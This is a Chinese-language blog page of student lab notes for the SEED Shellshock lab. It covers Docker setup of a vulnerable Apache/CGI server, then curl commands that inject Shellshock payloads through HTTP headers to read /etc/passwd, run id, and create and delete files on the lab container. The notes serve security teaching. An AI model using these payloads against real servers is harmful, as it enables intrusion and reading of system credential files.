@@ -1,0 +1,483 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>03_Lab02《计算机安全导论：深度实践》ShellShock实验 | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hnu《软件安全测试》学习笔记  一、概述： https:&#x2F;&#x2F;seedsecuritylabs.org&#x2F;Labs_20.04&#x2F;Files&#x2F;Shellshock&#x2F;Shellshock.pdf 实验主题： Shellshock Environment variables Function definition in bash Apache and CGI programs   实验环境： Seed">
+<meta property="og:type" content="article">
+<meta property="og:title" content="03_Lab02《计算机安全导论：深度实践》ShellShock实验">
+<meta property="og:url" content="http://example.com/2023/10/17/03_ShellShockAttack/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="hnu《软件安全测试》学习笔记  一、概述： https:&#x2F;&#x2F;seedsecuritylabs.org&#x2F;Labs_20.04&#x2F;Files&#x2F;Shellshock&#x2F;Shellshock.pdf 实验主题： Shellshock Environment variables Function definition in bash Apache and CGI programs   实验环境： Seed">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-10-17T09:10:55.000Z">
+<meta property="article:modified_time" content="2023-10-17T09:10:14.172Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="软件安全测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/10/17/03_ShellShockAttack/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '03_Lab02《计算机安全导论：深度实践》ShellShock实验',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-17 17:10:14'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">03_Lab02《计算机安全导论：深度实践》ShellShock实验</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-10-17T09:10:55.000Z" title="Created 2023-10-17 17:10:55">2023-10-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-10-17T09:10:14.172Z" title="Updated 2023-10-17 17:10:14">2023-10-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="03_Lab02《计算机安全导论：深度实践》ShellShock实验"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li>hnu《软件安全测试》学习笔记</li>
+</ul>
+<h1 id="一、概述："><a href="#一、概述：" class="headerlink" title="一、概述："></a>一、概述：</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://seedsecuritylabs.org/Labs_20.04/Files/Shellshock/Shellshock.pdf">https://seedsecuritylabs.org/Labs_20.04/Files/Shellshock/Shellshock.pdf</a></li>
+<li>实验主题：<ul>
+<li>Shellshock</li>
+<li>Environment variables</li>
+<li>Function definition in bash</li>
+<li>Apache and CGI programs</li>
+</ul>
+</li>
+<li>实验环境：<ul>
+<li>Seed Ubuntu 20.04 VM</li>
+</ul>
+</li>
+</ul>
+<h1 id="二、实验环境配置："><a href="#二、实验环境配置：" class="headerlink" title="二、实验环境配置："></a>二、实验环境配置：</h1><h2 id="1、DNS配置："><a href="#1、DNS配置：" class="headerlink" title="1、DNS配置："></a>1、DNS配置：</h2><ul>
+<li>web 服务器的IP地址是10.9.0.80（根据实际变动），服务器主机的名称为<a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a></li>
+<li>为了能正确访问<a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com,需要修改/etc/hosts%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">www.seedlab-shellshock.com，需要修改/etc/hosts配置文件</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.9.0.80 www.seedlab-shellshock.com</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>sudo vim &#x2F;etc&#x2F;hosts发现已经配置好了</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151500009.png" alt="image-20231015150045984"></p>
+<h2 id="2、docker-compose："><a href="#2、docker-compose：" class="headerlink" title="2、docker-compose："></a>2、docker-compose：</h2><ul>
+<li>下载这个lab的Labsetup.zip</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151333736.png" alt="image-20231015133314666"></p>
+<ul>
+<li>因为某些docker-compose指令太长了，为这些指令在.bashrc文件中取了别名：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dcbuild 		#docker-compose build，根据当前目录下的dockerfile（或者-f指定），构建容器的镜像</span><br><span class="line">dcup 			#docker-compose up，根据当前目录下的dockerfile（或者-f指定），启动容器</span><br><span class="line">dcdown 			#docker-compose down，根据当前目录下的dockerfile（或者-f指定），停止容器</span><br><span class="line">dockps 			#docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;，显示当前启动的容器，容器ID 容器名称</span><br><span class="line">docksh &lt;id&gt; 	#docker exec -it &lt;id&gt; /bin/bash，启动对应容器ID的shell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>yml文件内容如下：主要指定了镜像的构建途径，进行了网络的划分</li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span>								<span class="comment">#指定compose版本</span></span><br><span class="line"><span class="attr">services:</span>									<span class="comment">#指定需要的服务，可以多个</span></span><br><span class="line">    <span class="attr">victim:</span>									<span class="comment">#单个服务victim</span></span><br><span class="line">        <span class="attr">build:</span> <span class="string">./image_www</span>					<span class="comment">#执行dcbuild时使用，指定了dockerfile所在的目录，即从/image_www中的dockerfile构建镜像	</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">seed-image-www-shellshock</span>	<span class="comment">#执行dcup时使用，指定从哪个镜像启动容器，此处使用seed-image-www-shellshock镜像</span></span><br><span class="line">        <span class="attr">container_name:</span> <span class="string">victim-10.9.0.80</span>	<span class="comment">#启动容器后的名称</span></span><br><span class="line">        <span class="attr">tty:</span> <span class="literal">true</span>							</span><br><span class="line">        <span class="attr">networks:</span></span><br><span class="line">            <span class="attr">net-10.9.0.0:</span></span><br><span class="line">                <span class="attr">ipv4_address:</span> <span class="number">10.9</span><span class="number">.0</span><span class="number">.80</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">    <span class="attr">net-10.9.0.0:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">net-10.9.0.0</span></span><br><span class="line">        <span class="attr">ipam:</span></span><br><span class="line">            <span class="attr">config:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">10.9</span><span class="number">.0</span><span class="number">.0</span><span class="string">/24</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进入image_www文件夹：</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151343137.png" alt="image-20231015134358107"></p>
+<ul>
+<li>查看dockerfile文件：dockerfile用于自定义镜像<ul>
+<li>第一行，FROM指定了基础的镜像</li>
+<li>中间部分，将此次需要的文件（如bash_shellshock），复制到了镜像中的对应目录，并对文件的权限进行了设置</li>
+<li>最后CMD指令，指定了从这个自定义镜像启动一个容器时，需要运行的指令，此处执行了两条指令<ul>
+<li>service apache2 start启动容器的apache服务</li>
+<li>tail -f &#x2F;dev&#x2F;null，该指令是因为容器执行了CMD指令后会自动由Running状态变为Exited，为了防止这种情况，使用这条指令可以阻塞容器（这条指令的意思是，监听有变化的文件内容，输出到&#x2F;dev&#x2F;null）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FROM handsonsecurity/seed-server:apache-php</span><br><span class="line"></span><br><span class="line">COPY bash_shellshock /bin/</span><br><span class="line">COPY vul.cgi getenv.cgi /usr/lib/cgi-bin/</span><br><span class="line">COPY server_name.conf  /etc/apache2/sites-available</span><br><span class="line">RUN  chmod 755 /bin/bash_shellshock \</span><br><span class="line">     &amp;&amp; chmod 755 /usr/lib/cgi-bin/*.cgi  \</span><br><span class="line">     &amp;&amp; a2ensite server_name.conf  </span><br><span class="line"></span><br><span class="line">CMD service apache2 start &amp;&amp; tail -f /dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、配置web服务器容器："><a href="#3、配置web服务器容器：" class="headerlink" title="3、配置web服务器容器："></a>3、配置web服务器容器：</h2><ul>
+<li>CGI程序需要放到Apache的默认CGI目录&#x2F;usr&#x2F;lib&#x2F;cgi-bin，vul.cgi内容如下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash_shellshock</span></span><br><span class="line"></span><br><span class="line">echo &quot;Content-type: text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo</span><br><span class="line">echo &quot;Hello World&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>启动web服务器后，访问的方法：<ul>
+<li>浏览器：<a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a></li>
+<li>curl命令：curl <a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="4、设置共享文件夹："><a href="#4、设置共享文件夹：" class="headerlink" title="4、设置共享文件夹："></a>4、设置共享文件夹：</h2><ul>
+<li><p>需要将Labsetup文件内容，复制到Ubuntu20.04，使用共享文件夹：</p>
+</li>
+<li><p>linux中新建文件夹：sudo mkdir &#x2F;mnt&#x2F;share</p>
+</li>
+<li><p>物理机新建文件夹：C:\Users\mailepusa\Desktop\sharefiles</p>
+</li>
+<li><p>在VBox上，选择共享文件夹：</p>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151419823.png" alt="image-20231015141928790"></p>
+<ul>
+<li><p>确定后，在文件夹左边栏可以看到共享文件夹sf_sharefiles</p>
+</li>
+<li><p>挂载点的用户是root，组是vboxsf，为了能访问挂载点，添加seed用户到vboxsf：sudo usermod -a -G vboxsf seed</p>
+</li>
+<li><p>执行后重启，成功看到共享文件夹：</p>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151424667.png" alt="image-20231015142414644"></p>
+<h2 id="5、启动容器："><a href="#5、启动容器：" class="headerlink" title="5、启动容器："></a>5、启动容器：</h2><ul>
+<li><p>将Labsetup复制到工作目录，进入第一层目录，启动shell</p>
+</li>
+<li><p>执行dcbuild指令，构建镜像</p>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151449286.png" alt="image-20231015144958255"></p>
+<ul>
+<li>docker images，可以查看新构建的镜像seed-image-www-shellshock：</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151451012.png" alt="image-20231015145146985"></p>
+<ul>
+<li>执行dcup指令，该指令会根据当前目录的.yml文件指定的镜像（即seed-image-www-shellshock：），启动一个容器，<strong>发现执行后当前shell也阻塞了</strong></li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151455790.png" alt="image-20231015145544762"></p>
+<ul>
+<li>重新启动一个shell，输入docker ps，发现已经成功启动了</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151458468.png" alt="image-20231015145844442"></p>
+<ul>
+<li>使用浏览器访问<a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi%EF%BC%8C%E5%9B%9E%E6%98%BEhello">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi，回显hello</a> world说明容器正常</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151501033.png" alt="image-20231015150142008"></p>
+<h1 id="三、实验任务："><a href="#三、实验任务：" class="headerlink" title="三、实验任务："></a>三、实验任务：</h1><h2 id="1、使用bash函数："><a href="#1、使用bash函数：" class="headerlink" title="1、使用bash函数："></a>1、使用bash函数：</h2><ul>
+<li><p>设计一个实验来检验bash_shellshock程序是否有shellshock漏洞，并在正常的bash程序中也进行这个实验。</p>
+</li>
+<li><p>使用bash函数来检验，原理：</p>
+<ul>
+<li>子shell进程将某些环境变量转换成shell函数时，由于解析逻辑的漏洞，<strong>不仅会解析变量中的指令，可能还会执行变量中的指令</strong>。</li>
+</ul>
+</li>
+<li><p>测试bash_shellshock：</p>
+<ul>
+<li>首先在正常的父bash进程中定义：export foo&#x3D;’() { echo “hello world”;}; echo “shellshock”; echo $$’</li>
+<li>启动bash_shellshock，发现成功执行了指令，即存在shellshock漏洞</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151438162.png" alt="image-20231015143830131"> </p>
+<ul>
+<li>测试正常bash：<ul>
+<li>首先在正常的父bash进程中定义：export foo&#x3D;’() { echo “hello world”;}; echo “shellshock”; echo $$’</li>
+<li>启动正常的bash，发现子shell进程没有执行指令，不存在shellshock漏洞</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151440791.png" alt="image-20231015144014762"></p>
+<h2 id="2、通过环境变量向bash传递数据："><a href="#2、通过环境变量向bash传递数据：" class="headerlink" title="2、通过环境变量向bash传递数据："></a>2、通过环境变量向bash传递数据：</h2><ul>
+<li>实验提供了getenv.cgi程序，来打印所有环境变量</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash_shellshock</span></span><br><span class="line"></span><br><span class="line">echo &quot;Content-type: text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;****** Environment Variables ******&quot;</span><br><span class="line">strings /proc/$$/environ</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1浏览器观察回显的环境变量："><a href="#2-1浏览器观察回显的环境变量：" class="headerlink" title="2.1浏览器观察回显的环境变量："></a>2.1浏览器观察回显的环境变量：</h3><ul>
+<li><p>比较http请求和回显的环境变量</p>
+</li>
+<li><p>浏览器访问：<a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi">http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi</a></p>
+</li>
+<li><p>回显的环境变量：</p>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151504150.png" alt="image-20231015150448112"></p>
+<ul>
+<li>f12查看网络中对应GET请求的请求头：</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151506260.png" alt="image-20231015150607233"></p>
+<ul>
+<li>比较发现，GET请求中的请求头出现在回显的环境变量中的有：<ul>
+<li>Host、User-Agent、Accept、Accept-Language、Connection、</li>
+<li>Upgrade-Insecure-Request、Cache-Control</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-2curl命令："><a href="#2-2curl命令：" class="headerlink" title="2.2curl命令："></a>2.2curl命令：</h3><ul>
+<li>使用curl命令，可以轻松控制http请求中的各项参数</li>
+<li>测试以下参数分别设置http请求中的哪些信息</li>
+<li>-v参数可以打印http通信的头部信息：curl -v <a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi">www.seedlab-shellshock.com/cgi-bin/getenv.cgi</a><ul>
+<li>如果没有-v，则不会打印前面的请求头和响应头，只会打印后面的响应体内容（即环境变量）</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151515492.png" alt="image-20231015151545455"></p>
+<ul>
+<li>-A参数：curl -A “my data” -v <a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi">www.seedlab-shellshock.com/cgi-bin/getenv.cgi</a><ul>
+<li>发现请求头中的User-Agent被设置为 my data</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151517287.png" alt="image-20231015151753257"></p>
+<ul>
+<li>-e参数：curl -e “my data” -v <a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi">www.seedlab-shellshock.com/cgi-bin/getenv.cgi</a><ul>
+<li>设置Referer</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151519031.png" alt="image-20231015151916001"></p>
+<ul>
+<li>-H参数：curl -H “AAAAAA: BBBBBB” -v <a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi">www.seedlab-shellshock.com/cgi-bin/getenv.cgi</a><ul>
+<li>设置了一个全新的请求头</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151520582.png" alt="image-20231015152034553"></p>
+<h2 id="3、实施shellshock攻击："><a href="#3、实施shellshock攻击：" class="headerlink" title="3、实施shellshock攻击："></a>3、实施shellshock攻击：</h2><ul>
+<li>shellshock不依赖CGI程序的具体内容，攻击目标是shell程序，而shell程序是在CGI程序内容执行之前启动的。</li>
+<li>攻击的环境变量的值：”() { echo hello;};echo Cotent-type:text&#x2F;plain;echo;&#x2F;bin&#x2F;ls -l;” <a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">www.seedlab-shellshock.com/cgi-bin/vul.cgi</a></li>
+<li>使用三种不同方法（三个不同的http请求头），实施shellshock攻击。</li>
+</ul>
+<h3 id="3-1A获取-etc-passwd："><a href="#3-1A获取-etc-passwd：" class="headerlink" title="3.1A获取&#x2F;etc&#x2F;passwd："></a>3.1A获取&#x2F;etc&#x2F;passwd：</h3><ul>
+<li>使用User-Agent：需要使用&#x2F;bin&#x2F;cat，直接cat无效</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A &quot;() &#123; echo hello;&#125;;echo Cotent-type:text/plain;echo;/bin/cat /etc/passwd;&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151537537.png" alt="image-20231015153743499"></p>
+<h3 id="3-2B获取进程用户的id："><a href="#3-2B获取进程用户的id：" class="headerlink" title="3.2B获取进程用户的id："></a>3.2B获取进程用户的id：</h3><ul>
+<li>使用Referer：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -e &quot;() &#123; echo hello;&#125;;echo Cotent-type:text/plain;echo;/bin/id;&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现是www-data用户</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151539110.png" alt="image-20231015153942081"></p>
+<h3 id="3-3C在-tmp文件夹下创建文件："><a href="#3-3C在-tmp文件夹下创建文件：" class="headerlink" title="3.3C在&#x2F;tmp文件夹下创建文件："></a>3.3C在&#x2F;tmp文件夹下创建文件：</h3><ul>
+<li>使用自定义请求头AAA：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;AAA:() &#123; echo hello;&#125;;echo Cotent-type:text/plain;echo;/bin/touch /tmp/shellshock;&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看&#x2F;tmp下是否有创建的文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;AAA:() &#123; echo hello;&#125;;echo Cotent-type:text/plain;echo;/bin/ls /tmp&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现成功创建：</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151545386.png" alt="image-20231015154539354"></p>
+<h3 id="3-4D删除前面创建的文件："><a href="#3-4D删除前面创建的文件：" class="headerlink" title="3.4D删除前面创建的文件："></a>3.4D删除前面创建的文件：</h3><ul>
+<li>删除：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;AAA:() &#123; echo hello;&#125;;echo Cotent-type:text/plain;echo;/bin/rm /tmp/shellshock;&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;AAA:() &#123; echo hello;&#125;;echo Cotent-type:text/plain;echo;/bin/ls /tmp&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现成功删除：</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151547364.png" alt="image-20231015154724336"></p>
+<h3 id="3-5问题："><a href="#3-5问题：" class="headerlink" title="3.5问题："></a>3.5问题：</h3><ul>
+<li>问题1：能否获取&#x2F;etc&#x2F;shadow的内容<ul>
+<li>不能，因为shellshock攻击的进程用户是www-data是普通用户，执行命令是也是普通用户的权限</li>
+</ul>
+</li>
+<li>问题2：程序将Get参数设置为环境变量时，能否实行shellshock攻击<ul>
+<li>不能（单纯设置为环境变量不行，还要使用system再启动一个shell）</li>
+<li>在当前进程中设置为环境变量，只是单纯的设置了一个值，不会触发解析为shell函数的解析漏洞，从而不会有shellshock漏洞。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151552021.png" alt="image-20231015155055788"></p>
+<ul>
